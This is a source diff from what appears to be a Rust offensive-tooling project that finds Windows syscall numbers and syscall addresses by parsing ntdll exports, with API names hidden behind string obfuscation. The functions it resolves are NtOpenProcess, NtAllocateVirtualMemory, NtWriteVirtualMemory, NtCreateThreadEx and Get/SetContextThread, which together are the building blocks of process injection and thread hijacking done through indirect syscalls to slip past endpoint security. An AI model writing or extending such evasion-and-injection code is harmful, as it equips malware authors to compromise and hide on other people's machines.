@@ -7,6 +7,8 @@ use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 use obfuse::obfuse;
 use anyhow::anyhow;
 
+use crate::parse_pe::{PeModuleParser, get_module_handle};
+
 
 #[repr(C)]
 #[derive(Copy, Clone, Debug)]
@@ -204,13 +206,41 @@ pub unsafe extern "win64" fn zw_set_context_thread(thread_handle: HANDLE, contex
     //     syscallret: PBYTE,
     // ) -> NTSTATUS;
 
-macro_rules! set_nt_ssn {
-    ($exports:ident, $func_name:expr, $func_index:expr) => {
-        unsafe {
-            let func_addr = $exports.get_function_address($func_name)
-                .map_err(|e| anyhow::anyhow!("[ERROR] API {} not found: {}", $func_name, e))? as *mut u8;
-            // let func_addr: *mut u8 = $exports.get_function_address($func_name).expect("API not found...") as *mut u8;
+// macro_rules! set_nt_ssn {
+//     ($exports:ident, $func_name:expr, $func_index:expr) => {
+//         unsafe {
+//             let func_addr = $exports.get_function_address($func_name)
+//                 .map_err(|e| anyhow::anyhow!("[ERROR] API {} not found: {}", $func_name, e))? as *mut u8;
+//             // let func_addr: *mut u8 = $exports.get_function_address($func_name).expect("API not found...") as *mut u8;
 
+//             let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);
+
+//             let mut ssn = 0;
+//             let mut syscall_ptr: *mut u8 = std::ptr::null_mut();
+//             for i in 0..bytes.len().saturating_sub(4) {
+//                 if bytes[i] == 0xB8 && ssn == 0 {
+//                     ssn = u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]]);
+//                 }
+//                 if bytes[i] == 0x0f && bytes[i + 1] == 0x05 {
+//                     syscall_ptr = func_addr.add(i) ;
+//                     break;
+//                 }
+//             }
+
+//             if ssn == 0 || syscall_ptr.is_null() {
+//                 return Err(anyhow!("[ERROR] Failed to find ssn or syscall address for {}", $func_name));
+//             }
+
+//             NT_SSN[$func_index as usize] = NtSsn { ssn: ssn , syscall_ret: syscall_ptr };
+
+//         }
+//     };
+// }
+
+macro_rules! set_nt_ssn {
+    ($parser:ident, $func_name:expr, $func_index:expr) => {
+        unsafe {
+            let Some(func_addr) = $parser.get_func_addr($func_name) else { anyhow::bail!("function not found") };
             let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);
 
             let mut ssn = 0;
@@ -229,16 +259,13 @@ macro_rules! set_nt_ssn {
                 return Err(anyhow!("[ERROR] Failed to find ssn or syscall address for {}", $func_name));
             }
 
-            NT_SSN[$func_index as usize] = NtSsn { ssn: ssn , syscall_ret: syscall_ptr };
-
-        }
+            NT_SSN[$func_index as usize] = NtSsn { ssn, syscall_ret: syscall_ptr };
+        } 
     };
 }
 
 
-
 pub static mut NT_SSN: [NtSsn; NT_FUNCTION_COUNT] = [NtSsn { ssn: 0, syscall_ret: std::ptr::null_mut(), }; NT_FUNCTION_COUNT];
-
 
 pub fn init_nt_api() -> Result<(), anyhow::Error>{
     let obfused_ntdll = obfuse!("ntdll.dll\0");
@@ -258,21 +285,15 @@ pub fn init_nt_api() -> Result<(), anyhow::Error>{
     let str_zw_get_context_thread = obfused_zw_get_context_thread.as_str();
     let str_zw_set_context_thread = obfused_zw_set_context_thread.as_str();
 
+    let ntdll_ptr: *mut u8 = unsafe { get_module_handle(ntdll_str) };
+    let parser =  PeModuleParser::new(ntdll_ptr);
 
-    let mut exports = ExportList::new();
-    let _ = exports.add(ntdll_str, str_nt_open_process);
-    let _ = exports.add(ntdll_str, str_nt_allocate_virtual_memory);
-    let _ = exports.add(ntdll_str, str_nt_write_virtual_memory);
-    let _ = exports.add(ntdll_str, str_nt_create_thread_ex);
-    let _ = exports.add(ntdll_str, str_zw_get_context_thread);
-    let _ = exports.add(ntdll_str, str_zw_set_context_thread);
-
-    set_nt_ssn!(exports, str_nt_allocate_virtual_memory, NtIndex::ZwAllocateVirtualMemory);
-    set_nt_ssn!(exports, str_nt_write_virtual_memory, NtIndex::ZwWriteVirtualMemory);
-    set_nt_ssn!(exports, str_nt_open_process, NtIndex::ZwOpenProcess);
-    set_nt_ssn!(exports, str_nt_create_thread_ex, NtIndex::ZwCreateThreadEx);
-    set_nt_ssn!(exports, str_zw_get_context_thread, NtIndex::ZwGetContextThread);
-    set_nt_ssn!(exports, str_zw_set_context_thread, NtIndex::ZwSetContextThread);
+    set_nt_ssn!(parser, str_nt_allocate_virtual_memory, NtIndex::ZwAllocateVirtualMemory);
+    set_nt_ssn!(parser, str_nt_write_virtual_memory, NtIndex::ZwWriteVirtualMemory);
+    set_nt_ssn!(parser, str_nt_open_process, NtIndex::ZwOpenProcess);
+    set_nt_ssn!(parser, str_nt_create_thread_ex, NtIndex::ZwCreateThreadEx);
+    set_nt_ssn!(parser, str_zw_get_context_thread, NtIndex::ZwGetContextThread);
+    set_nt_ssn!(parser, str_zw_set_context_thread, NtIndex::ZwSetContextThread);
 
     Ok(())
 }
